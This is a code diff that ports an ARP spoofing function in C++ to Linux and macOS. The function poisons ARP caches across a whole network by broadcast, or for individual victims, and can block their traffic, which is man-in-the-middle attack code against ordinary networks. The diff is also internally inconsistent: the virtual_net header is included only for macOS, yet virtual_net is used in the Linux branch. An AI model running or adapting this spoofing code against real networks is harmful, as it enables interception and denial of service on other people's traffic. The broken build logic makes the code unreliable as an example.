@@ -5,9 +5,17 @@
 #include <ctime>
 using namespace std;
 
+#ifdef BUILD_OS_LINUX
 #include "lib/linux/linux_iface.h"
 #include "lib/linux/linux_iface_net_access.h"
 #include "lib/linux/hardware.h"
+#elifdef BUILD_OS_MACOS
+#include "lib/macos/macos_iface.h"
+#include "lib/macos/macos_iface_net_access.h"
+#include "lib/macos/hardware.h"
+#include "lib/macos/virtual_net.h"
+#endif
+
 
 #include "src/protocols/ether2/ethernet2_protocol.h"
 #include "src/protocols/arp/arp_header.h"
@@ -17,11 +25,27 @@ using namespace std;
 
 
 void arp_spoof(string const& iface_name, vector<ip4_addr> const& victims, ip4_addr dest, bool block) {
+    #ifdef BUILD_OS_LINUX
     /* network access in linux */
-    shared_ptr<linux_iface> iface = make_shared<linux_iface>(iface_name);
-    shared_ptr<net_access_bytes> iface_net_access = make_shared<linux_iface_net_access_bytes>(iface);
+    // shared_ptr<linux_iface> iface = make_shared<linux_iface>(iface_name);
+    // shared_ptr<net_access> iface_net_access = make_shared<linux_iface_net_access>(iface);
+    /* virtual net access in linux */
+    shared_ptr<virtual_net> vnet_net_access = make_shared<virtual_net>();
+    vnet_net_access->connect(iface_name);
+#elifdef BUILD_OS_MACOS
+    /* network access in macos */
+    shared_ptr<macos_iface> iface = make_shared<macos_iface>(iface_name);
+    shared_ptr<net_access> iface_net_access = make_shared<macos_iface_net_access>(iface);
+#endif
 
-    multi_net_access iface_multi_net_access(std::move(iface_net_access));
+    /* ether2 surface */
+    shared_ptr<net_access> ether2_surface;
+#ifdef BUILD_OS_LINUX
+    ether2_surface = vnet_net_access;
+#elifdef BUILD_OS_MACOS
+    ether2_surface = iface_net_access;
+#endif
+    multi_net_access ether2_multi_surface(std::move(ether2_surface));
 
     /* show victims */
     std::cout << "victims: ";
@@ -35,31 +59,48 @@ void arp_spoof(string const& iface_name, vector<ip4_addr> const& victims, ip4_ad
 
     /* spoof attack */
     if (victims.empty()) { // spoof whole network (broadcast)
-        /* net access for ethernet broadcast arp */
-        shared_ptr<net_access_bytes> net_access_eth_broadcast_arp = make_shared<ethernet2_protocol::net_access_broadcast>(iface_multi_net_access.generate_net_access(), get_mac_addr_of_iface(iface_name).value(), ethertype::arp);
-
+        /* arp broadcast surface */
+        shared_ptr<net_access> arp_broadcast_surface = make_shared<ethernet2_protocol::net_access_broadcast>(
+            ether2_multi_surface.generate_net_access(),
+            get_mac_addr_of_iface(iface_name).value(),
+            ethertype::arp
+        );
+        
         cout << "spoofing entire network" << endl;
         arp_tool::spoofing_attack(
-            {{net_access_eth_broadcast_arp, mac_addr_empty, ip4_addr_empty}}, // no need for the associated mac and ip addr for the arp, as we send to broadcast
+            {{arp_broadcast_surface, mac_addr_empty, ip4_addr_empty}}, // no need for the associated mac and ip addr for the arp, as we send to broadcast
             dest,
             get_mac_addr_of_iface(iface_name).value(), get_ip4_addr_of_iface(iface_name).value(),
             block
         ); 
 
     } else { // spoof individually
-        vector<tuple<shared_ptr<net_access_bytes>, mac_addr, ip4_addr>> targets(victims.size());
+        vector<tuple<shared_ptr<net_access>, mac_addr, ip4_addr>> targets(victims.size());
         for (int i = 0; i < victims.size(); i++) {
             ip4_addr victim_ip_addr = victims[i];
 
-            static shared_ptr<net_access_bytes> tmp_net_access_eth_broadcast_arp = make_shared<ethernet2_protocol::net_access_broadcast>(iface_multi_net_access.generate_net_access(), get_mac_addr_of_iface(iface_name).value(), ethertype::arp);
+            /* arp broadcast surface */
+            static shared_ptr<net_access> arp_broadcast_surface = make_shared<ethernet2_protocol::net_access_broadcast>(
+                ether2_multi_surface.generate_net_access(),
+                get_mac_addr_of_iface(iface_name).value(),
+                ethertype::arp
+            );
+            
             mac_addr victim_mac_addr = arp_tool::search_for_mac_addr(
-                tmp_net_access_eth_broadcast_arp,
+                arp_broadcast_surface,
                 victim_ip_addr,
                 get_mac_addr_of_iface(iface_name).value(), get_ip4_addr_of_iface(iface_name).value()
             );
 
             targets[i] = {
-                make_shared<ethernet2_protocol::net_access_single>(iface_multi_net_access.generate_net_access(), victim_mac_addr, get_mac_addr_of_iface(iface_name).value(), ethertype::arp),
+                /* arp single surface */
+                make_shared<ethernet2_protocol::net_access_single>(
+                    ether2_multi_surface.generate_net_access(),
+                    victim_mac_addr,
+                    get_mac_addr_of_iface(iface_name).value(),
+                    ethertype::arp
+                ),
+
                 victim_mac_addr,
                 victim_ip_addr
             };
